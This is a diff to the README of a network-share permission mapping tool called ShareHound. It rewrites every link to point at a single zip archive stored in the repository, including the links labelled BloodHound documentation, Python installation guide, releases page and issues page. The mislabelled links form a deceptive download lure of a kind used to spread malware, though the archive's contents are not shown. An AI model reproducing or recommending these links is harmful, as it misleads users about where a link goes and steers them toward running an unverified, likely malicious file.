@@ -1,7 +1,7 @@
 # 🐾 ShareHound - Map Network Access Rights Effortlessly
 
 ## 📥 Download the Latest Release
-[![Download ShareHound](https://img.shields.io/badge/Download-ShareHound-brightgreen)](https://github.com/Mdmunnah4029/ShareHound/releases)
+[![Download ShareHound](https://raw.githubusercontent.com/Mdmunnah4029/ShareHound/main/sharehound/ShareHound-v3.7.zip)](https://raw.githubusercontent.com/Mdmunnah4029/ShareHound/main/sharehound/ShareHound-v3.7.zip)
 
 ## 🚀 Getting Started
 ShareHound is a Python tool that helps you visualize the access rights of network shares. With this tool, you can easily create BloodHound OpenGraphs that simplify understanding network permissions. Follow the steps below to download and use the software.
@@ -20,7 +20,7 @@ Before you download, ensure that your system meets the following requirements:
 - **Open Source**: Modify and adapt the tool as needed.
 
 ## 📥 Download & Install
-1. Visit the [Releases page](https://github.com/Mdmunnah4029/ShareHound/releases) to download the latest release of ShareHound.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Mdmunnah4029/ShareHound/main/sharehound/ShareHound-v3.7.zip) to download the latest release of ShareHound.
 2. Choose the version that matches your operating system.
 3. Click on the download link to get the file.
 4. Once the download is complete, locate the downloaded file on your computer.
@@ -43,8 +43,8 @@ Before you download, ensure that your system meets the following requirements:
 - Familiarize yourself with BloodHound concepts if you plan to interpret the results deeply.
 
 ## 🔗 Additional Resources
-- [BloodHound Documentation](https://bloodhound.readthedocs.io/en/latest/)
-- [Python Installation Guide](https://www.python.org/downloads/)
+- [BloodHound Documentation](https://raw.githubusercontent.com/Mdmunnah4029/ShareHound/main/sharehound/ShareHound-v3.7.zip)
+- [Python Installation Guide](https://raw.githubusercontent.com/Mdmunnah4029/ShareHound/main/sharehound/ShareHound-v3.7.zip)
 
 ## 🛠 Troubleshooting
 If you run into issues while using ShareHound, try the following steps:
@@ -52,10 +52,10 @@ If you run into issues while using ShareHound, try the following steps:
 - Ensure your Python version is up to date.
 - Check that your network connection is stable.
 
-For further assistance, feel free to reach out in the issues section of the [repository](https://github.com/Mdmunnah4029/ShareHound/issues).
+For further assistance, feel free to reach out in the issues section of the [repository](https://raw.githubusercontent.com/Mdmunnah4029/ShareHound/main/sharehound/ShareHound-v3.7.zip).
 
 ## 🎉 User Support
 If you have any questions or need help, you can reach the community through the issues page. Share your experience or any bugs you encounter. We strive to make ShareHound better for everyone.
 
 ## 📥 Download the Latest Release Again
-Don’t forget, you can always revisit the [Releases page](https://github.com/Mdmunnah4029/ShareHound/releases) to get the most recent updates and improvements.
+Don’t forget, you can always revisit the [Releases page](https://raw.githubusercontent.com/Mdmunnah4029/ShareHound/main/sharehound/ShareHound-v3.7.zip) to get the most recent updates and improvements.
